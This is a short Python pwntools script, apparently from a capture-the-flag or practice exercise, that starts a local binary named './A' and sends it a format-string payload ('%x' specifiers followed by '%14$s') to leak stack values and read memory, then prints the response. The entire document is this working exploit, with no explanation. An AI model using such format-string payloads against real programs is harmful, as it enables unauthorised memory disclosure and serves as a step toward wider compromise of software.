#encoding=utf-8
from pwn import *



p=process('./A')
payload="%x.%x.%x.%x.%x.%x.%x.%x.%x.%14$s"
p.sendline(payload)
print p.recvall();

	

